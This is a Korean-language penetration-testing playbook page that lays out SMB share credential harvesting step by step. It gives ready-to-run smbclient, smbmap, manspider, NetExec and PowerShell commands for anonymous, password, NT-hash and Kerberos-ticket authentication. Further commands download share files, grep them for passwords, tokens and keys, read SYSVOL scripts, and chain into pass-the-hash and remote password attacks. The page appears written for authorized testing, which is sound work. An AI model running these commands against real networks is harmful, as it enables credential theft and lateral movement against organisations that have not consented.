---
tags:
  - 환경/windows
  - 환경/linux
  - 서비스/smb
시작조건: ["실행 호스트에서 SMB 서비스 접근 가능", "공유 목록 또는 공유명 확보"]
필요권한: ["익명·Guest 또는 요청자 SMB 계정으로 공유와 개별 파일을 읽을 권한"]
필요조건: ["익명 접근 가능 상태 또는 요청자 계정의 비밀번호·NT hash·Kerberos ticket", "다운로드와 로컬 검색이 가능한 저장 위치"]
결과: ["읽기 가능한 파일 사본", "평문 비밀번호·token·key·접속 문자열 후보", "내부 호스트·경로·기술 정보"]
---

# SMB 공유 자격증명 수집

## 한 줄 판단

실행 호스트에서 대상 445/TCP에 접근할 수 있으면 익명·Guest 또는 요청자 계정의 비밀번호·NT hash·Kerberos ticket 중 현재 가능한 SMB 인증 방식을 선택하고, 해당 SMB 세션이 READ 가능한 공유에서 평문 비밀번호, token, key, 접속 문자열과 내부 서비스 단서를 수집한다.

## 사용할 때

- 현재 보유 정보: 익명 접근 가능 여부 또는 SMB 요청자 계정의 사용자명과 비밀번호·NT hash·Kerberos ticket 중 하나, 그리고 공유명 또는 공유 목록을 확보했다.
- 명령 실행 위치와 도달성: `smbclient`, `smbmap` 또는 manspider를 실행할 호스트에서 대상 SMB 445/TCP에 접근하고 수집 파일을 로컬에 저장할 수 있다.
- 현재 가능한 행동과 결과: `IT`, `Backups`, `Users`, `SYSVOL`, `Dev`, `Deploy`, `Scripts` 같은 공유에서 현재 SMB 계정이 읽을 수 있는 파일만 선별해 credential 후보와 내부 정보를 얻는다.

## 전제 조건

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| 명령 실행 위치와 네트워크 경로 | 실행 호스트에서 대상 SMB 445/TCP 접근 가능 | SMB 연결과 대상 호스트·공유명 확인 | DNS·라우팅·방화벽과 SMB 서비스 상태 확인 |
| 현재 계정 또는 인증 수단 | 익명·Guest 허용 상태 또는 로컬·도메인 요청자의 비밀번호·NT hash·Kerberos ticket 확보 | `smbclient` 인증 결과와 실제 session Identity 확인 | 익명·로컬·도메인 계정 범위, hash 소유자, ccache principal과 대상 FQDN 확인 |
| 현재 권한 | 현재 SMB 계정에 공유 목록 조회와 후보 파일 READ 권한이 있음 | 공유별 권한과 개별 파일 다운로드를 각각 확인 | 공유 권한과 파일 ACL을 분리하고 읽을 수 있는 하위 경로만 확인 |
| 공격 대상의 조건 | 민감 정보가 있을 가능성이 높은 공유와 디렉터리 식별 | 공유명, 디렉터리 구조, 파일 확장자·타임스탬프 확인 | 전체 다운로드 대신 역할 기반 경로와 최근 설정·백업 파일로 범위 축소 |
| 필요한 파일·목록·주소 | 로컬 저장 경로와 검색 키워드 준비 | 다운로드 여유 공간과 `rg` 검색 위치 확인 | 저장 위치를 확정하고 중복·대용량 파일 수집 범위 조정 |

## 실행

1. 공유별 READ/WRITE 권한과 디렉터리 구조를 확인한다.
2. 우선순위 높은 파일만 선별 다운로드한다.
3. `password`, `pwd`, `user`, `key`, `connectionString`, `secret`, `token` 키워드로 검색한다.
4. 나온 값이 평문 비밀번호, token, DB 접속 문자열 또는 key 중 무엇인지 구분하고, 계정 잠금 정책과 대상 서비스를 확인한 뒤 최소 횟수로 검증한다.

### SMB 인증 방식 선택

각 명령의 인증 주체는 공유를 읽는 요청자다. 공유 안에서 발견할 사용자명·비밀번호·key는 별도의 수집 대상이며 요청자 인증 수단과 같은 값이라고 가정하지 않는다.

| 현재 보유 상태 | 사용할 방식 | 성공 판단 |
|---|---|---|
| 계정 없이 목록 또는 공유 읽기 가능 | 익명/null session | 비밀번호 없이 share·파일 목록 또는 다운로드 성공 |
| 로컬·도메인 요청자의 평문 비밀번호 | 비밀번호 인증 | 해당 요청자 Identity로 SMB session 생성 |
| 로컬·도메인 요청자의 NT hash | Samba `--pw-nt-hash` | NT hash가 속한 요청자 Identity로 SMB session 생성 |
| 도메인 요청자의 유효한 TGT 또는 CIFS ticket | Kerberos ccache | ccache principal과 `cifs/<TARGET_FQDN>`로 SMB session 생성 |

#### 1. 익명/null session

```bash
smbclient //<TARGET>/<SHARE> -N -c 'ls'
```

#### 2. 요청자 평문 비밀번호

```bash
smbclient //<TARGET>/<SHARE> -W <DOMAIN> -U '<REQUESTER>%<PASSWORD>' -c 'ls'
```

#### 3. 요청자 NT hash

```bash
smbclient //<TARGET>/<SHARE> -W <DOMAIN> -U '<REQUESTER>%<NT_HASH>' --pw-nt-hash -c 'ls'
```

`<NT_HASH>`는 공유에서 수집하려는 계정의 hash가 아니라 SMB session을 만들 `<REQUESTER>`의 NT hash다.

#### 4. 요청자 Kerberos ccache

```bash
klist -c <CCACHE_FILE>
smbclient //<TARGET_FQDN>/<SHARE> --use-kerberos=required --use-krb5-ccache=<CCACHE_FILE> -N -c 'ls'
```

`-N`은 비밀번호 프롬프트를 생략할 뿐 익명으로 강등한다는 뜻이 아니다. 실제 인증은 `<CCACHE_FILE>`의 principal과 ticket이 수행하며 Kerberos SPN 일치를 위해 IP보다 `<TARGET_FQDN>`을 사용한다.

### 공유 접근과 다운로드

다운로드 전에 이번 작업의 고유 로컬 디렉터리를 만든다.

```bash
test ! -e '<SMB_COLLECTION_DIR>' || exit 1
install -d -m 700 '<SMB_COLLECTION_DIR>'
```

```bash
smbclient //<TARGET>/<SHARE> -U '<REQUESTER>%<PASSWORD>'
smb: \> recurse ON
smb: \> lcd <SMB_COLLECTION_DIR>
smb: \> get <REMOTE_FILE> <LOCAL_FILE>
```

확인할 출력:

- 실제로 `<SMB_COLLECTION_DIR>/<LOCAL_FILE>`에 저장된 설정·백업·스크립트·문서의 크기와 hash. 공유 목록 조회만 성공한 상태와 파일 다운로드 성공을 구분한다.
- 전체 `mget *`보다 역할·확장자·수정 시간으로 선별한 `<REMOTE_FILE>`을 우선한다. 추가 파일은 각 원격·로컬 경로를 작업 기록에 별도로 남긴다.

### 권한과 파일 후보 빠른 확인

```bash
smbmap -H <TARGET> -u <REQUESTER> -p '<PASSWORD>'
smbmap -H <TARGET> -u <REQUESTER> -p '<PASSWORD>' -R <SHARE>
```

확인할 출력:

- 공유별 READ/WRITE, 흥미로운 파일 경로.

### 키워드 검색

```bash
test ! -e '<MANSPIDER_OUTPUT_DIR>' || exit 1
install -d -m 700 '<MANSPIDER_OUTPUT_DIR>'
manspider <TARGET> --sharenames '<SHARE>' -u <REQUESTER> -p '<PASSWORD>' -c 'password' -l '<MANSPIDER_OUTPUT_DIR>'
rg -i "password|passwd|pwd|secret|token|connection|string|key" '<MANSPIDER_OUTPUT_DIR>/loot'
```

확인할 출력:

- 값이 기록된 파일 경로와 평문 비밀번호, API token, DB 접속 문자열, SSH key 또는 내부 URL.
- `NT_STATUS_ACCESS_DENIED`가 나오면 SMB 인증 실패인지 share READ 또는 개별 파일 ACL 거부인지 실행 단계별로 확인한다.
- `NT_STATUS_LOGON_FAILURE`는 익명 허용 여부 또는 요청자 계정 범위·비밀번호·NT hash·ccache를 확인한다. session은 생성됐지만 다운로드가 거부되면 인증 성공과 share·파일 READ 권한을 분리한다.

### NetExec로 파일명 후보 선별

이미 NetExec을 사용하고 있고 특정 공유의 파일명·경로를 먼저 좁힐 때 쓴다. 현재 공식 `--spider`·`--pattern` 예시는 파일명 pattern을 찾으며 본문 content 검색·다운로드를 증명하지 않는다.

```bash
nxc smb <TARGET> -u <REQUESTER> -p '<PASSWORD>' --spider '<SHARE>' --pattern '<FILENAME_PATTERN>'
```

확인할 출력:

- SMB 인증 성공, spider 시작과 pattern에 일치한 원격 경로를 각각 분리한다.
- content 검색·매치 파일 로컬 보존이 필요하면 [[manspider]]로 전환한다. NetExec workspace에 인증·host 자료가 남을 수 있으므로 [[netexec]]의 workspace 경계를 확인한다.

### Windows 공격 호스트에서 여러 SMB 공유 검색

현재 Windows 세션에서 공유 하나를 직접 검색할 때는 작업 전 존재하지 않는 PSDrive 이름을 고르고 password를 prompt에 입력한다. `<SMB_DRIVE>`에는 콜론 없는 한 글자 이름을 사용한다.

```powershell
Get-PSDrive -PSProvider FileSystem
$Credential = Get-Credential -UserName '<DOMAIN>\<REQUESTER>' -Message 'SMB share credential'
New-PSDrive -Name '<SMB_DRIVE>' -PSProvider FileSystem -Root '\\<TARGET>\<SHARE>' -Credential $Credential
Get-ChildItem '<SMB_DRIVE>:\' -Recurse -File -Include '*cred*','*pass*','*secret*','*.config','*.xml','*.ps1','*.bat' -ErrorAction SilentlyContinue
Get-ChildItem '<SMB_DRIVE>:\' -Recurse -File -Include '*.txt','*.config','*.xml','*.ps1','*.bat' -ErrorAction SilentlyContinue |
  Select-String -Pattern 'password|passwd|pwd|credential|secret|token|connection|string|key' -List
```

확인할 출력:

- `New-PSDrive`의 Root가 의도한 UNC이고, 파일명·본문 검색 결과가 현재 요청자에게 실제 READ 가능한 원격 경로를 가리키는지 확인한다.
- `Get-Credential`의 `SecureString`은 이 PowerShell 프로세스 안에서 credential object로 쓰일 뿐 원격 서비스가 수락했다는 증거가 아니다. drive 생성과 실제 파일 조회로 SMB 인증·share READ를 각각 확인한다.
- `Access is denied`는 drive 인증, share ACL 또는 개별 파일 ACL 중 어느 단계인지 명령별로 구분한다. 재귀 검색이 느리거나 차단되면 역할 기반 하위 경로와 확장자로 범위를 줄인다.

검색 뒤에는 이번에 만든 PSDrive만 제거하고 기존 drive·SMB session은 건드리지 않는다.

```powershell
Remove-PSDrive -Name '<SMB_DRIVE>'
Remove-Variable Credential
Get-PSDrive -Name '<SMB_DRIVE>' -ErrorAction SilentlyContinue
Get-Variable Credential -ErrorAction SilentlyContinue
```

마지막 두 확인이 아무것도 반환하지 않아야 이번 매핑과 작업용 credential 변수 정리가 확인된다. 현재 위치가 해당 drive 안이면 `Remove-PSDrive`가 실패하므로 기존 로컬 경로로 이동한 뒤 같은 정확한 이름을 다시 제거한다. 원격 파일은 조회만 하며 복사·수정·삭제하지 않는다.

PowerHuntShares를 사용할 수 있으면 도메인 공유를 병렬로 확인하고 HTML 보고서를 생성한다.

현재 도메인 사용자 컨텍스트에서 도메인 전체 공유를 순회하며 자격 증명·키·설정 파일 후보를 자동 분류해야 하면 [[Snaffler로 도메인 SMB 공유 민감 파일 탐색]]으로 분기한다.

```powershell
if (Test-Path -LiteralPath '<POWERSHARES_PARENT>') { throw 'Output parent already exists' }
New-Item -ItemType Directory -Path '<POWERSHARES_PARENT>'
Import-Module .\PowerHuntShares.psm1
Invoke-HuntSMBShares -Threads <THREAD_COUNT> -OutputDirectory '<POWERSHARES_PARENT>'
```

확인할 출력:

- 탐색한 호스트·공유와 읽기 가능한 경로 수.
- 출력에 표시된 `<POWERSHARES_RUN_DIR>` 절대 경로와 그 안에 생성된 HTML·CSV·log. `-OutputDirectory`는 parent이며 도구가 `SmbShareHunt-<timestamp>` 하위 경로를 만들 수 있으므로 실제 출력을 기록한다.
- 자동 분류 결과는 파일 접근 권한과 민감 정보 노출을 확정하지 않으므로 실제 파일 경로와 내용을 다시 확인한다.
- `<THREAD_COUNT>`는 승인된 호스트 수·SMB 제한·관찰 조건에서 작게 시작해 조정한다. 교육 예시의 `100`을 모든 환경의 기본값으로 쓰지 않는다.

### SYSVOL 스크립트의 평문 자격 증명 검색

DC의 `SYSVOL` 또는 `scripts`가 보이면 일반 공유와 같은 READ 권한으로 스크립트를 열고 계정명·비밀번호·실행 대상을 함께 확인한다.

```powershell
ls \\<DC>\SYSVOL\<DOMAIN>\scripts
cat \\<DC>\SYSVOL\<DOMAIN>\scripts\<SCRIPT>
```

확인할 출력:

- 배치·VBScript·PowerShell 파일에 기록된 사용자명, 비밀번호와 실행 대상.
- 발견한 값이 로컬 계정인지 도메인 계정인지 판단할 호스트·도메인 단서.
- `Groups.xml`, `Registry.xml` 또는 `cpassword`가 보이면 [[SYSVOL GPP 자격 증명 수집]]으로 분기한다.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| 공유별 `READ`와 파일 목록 | 공유 콘텐츠 접근 가능 | 파일 수집 경로 확보 | 우선순위 파일만 다운로드 |
| 평문 비밀번호, token, 접속 문자열 또는 key | 파일 기반 자격증명 노출 | credential 후보 확보 | 계정 형식과 대상 서비스를 확인 |
| 내부 호스트명, 경로 또는 기술 스택 | 재사용 가능한 환경 정보 노출 | 내부 정보 확보 | 관련 서비스 문서에서 다음 기법 선택 |
| 정상 클라이언트로 대상 서비스 인증 성공 | 수집한 credential이 해당 서비스와 계정 형식에서 현재 유효함 | 해당 서비스의 인증 성공 | [[확보한 자격 증명으로 원격 접근 경로 선택]]에서 세션·READ/WRITE·관리자 권한 분리 확인 |
| 파일이 너무 많음 | 수집 범위 과다 | 유효 단서 미선별 | 확장자, 키워드, 타임스탬프로 축소 |
| 다운로드 거부 | 공유 권한과 파일 ACL 차이 | 목록만 확인 또는 일부 경로만 접근 | 하위 경로와 인증 계정 권한 확인 |
| credential 검증 실패 | 오래된 비밀번호 또는 계정 형식 오류 | 유효 credential 미확인 | 도메인/로컬 계정과 서비스별 인증 방식 확인 |
| SYSVOL 스크립트에서 계정명과 평문 비밀번호 발견 | 관리 스크립트에 자격 증명 노출 | 로컬 또는 도메인 credential 후보 | 계정 형식과 적용 호스트 확인 |
| GPP·autologon 단서 발견 | GPP XML 전용 판단 필요 | credential 후보 미확정 | [[SYSVOL GPP 자격 증명 수집]] |

## 확인할 출력과 권한

- 공유의 `READ`와 개별 파일 다운로드 성공을 구분한다.
- 파일에 적힌 계정이 로컬 계정인지 도메인 계정인지 먼저 판별한다.
- credential 유효성, 원격 로그인 권한, 로컬 관리자 또는 도메인 권한은 각각 별도로 확인한다.
- token·SSH key·DB 접속 문자열은 평문 비밀번호와 사용 방법이 다르므로 값의 종류와 적용 서비스부터 확인한다.

## 변경 영향과 로컬 산출물 정리

원격 SMB 파일은 읽기만 하고 수정·삭제하지 않는다. 이 절차는 로컬 파일 사본, MANSPIDER loot·log, PowerHuntShares report, NetExec workspace 기록을 남길 수 있다.

- 로컬 사본은 `<SMB_COLLECTION_DIR>` 안의 이번 작업 파일 경로를 전부 확인한 뒤 하위에서부터 정리한다.
- MANSPIDER는 [[manspider]]의 `<MANSPIDER_OUTPUT_DIR>` 생성·정리 절차를 따른다.
- PowerHuntShares는 출력에서 확인한 `<POWERSHARES_RUN_DIR>`을 먼저 제거하고, 이번 작업이 만든 parent가 빈 후에만 제거한다.
- NetExec workspace 삭제는 설치 버전의 지원 계약이 확인되지 않았다면 완료로 표시하지 않고 [[netexec]]에 남은 민감 상태를 기록한다.

```bash
find '<SMB_COLLECTION_DIR>' -xdev -depth -type f -delete
find '<SMB_COLLECTION_DIR>' -xdev -depth -type d -empty -delete
test ! -e '<SMB_COLLECTION_DIR>'
```

```powershell
Remove-Item -LiteralPath '<POWERSHARES_RUN_DIR>' -Recurse -Force
Remove-Item -LiteralPath '<POWERSHARES_PARENT>' -Force
Test-Path -LiteralPath '<POWERSHARES_RUN_DIR>'
Test-Path -LiteralPath '<POWERSHARES_PARENT>'
```

두 `Test-Path`가 `False`여야 report 정리가 확인된다. 예상하지 않은 파일·하위 디렉터리가 있거나 경로·소유자가 다르면 재귀 삭제를 중단한다. 이미 전달된 credential·terminal history·SMB·AD 감사 로그는 로컬 파일 정리로 되돌려지지 않는다.

## 후속 공격 연결

- 도메인 전체 공유 자동 선별: [[Snaffler로 도메인 SMB 공유 민감 파일 탐색]]
- 수집한 credential: [[원격 비밀번호 공격]]
- NTLM hash: [[Pass the Hash]]
- SSH key: [[SSH credential 및 키 인증 검증]]
- DB credential: [[DB 인증과 데이터 열거]]
- SYSVOL GPP credential: [[SYSVOL GPP 자격 증명 수집]]

## 관련 서비스

- [[SMB 서비스]]

## 관련 상태 라우터

- 수집한 credential의 원격 인증 가능성을 확인할 때: [[확보한 자격 증명으로 원격 접근 경로 선택]]

## 관련 도구

- [[smbclient]]
- [[smbmap]]
- [[manspider]]
- [[Snaffler]]
- [[crackmapexec]]
- [[klist]]
- [[PowerHuntShares]]

## 참고 링크

- [Samba smbclient manual](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)
- [Microsoft — What is SMB File Sharing](https://learn.microsoft.com/en-us/windows-server/storage/file-server/file-server-smb-overview)
- [Microsoft — New-PSDrive](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/new-psdrive)
- [Microsoft — Remove-PSDrive](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/remove-psdrive)
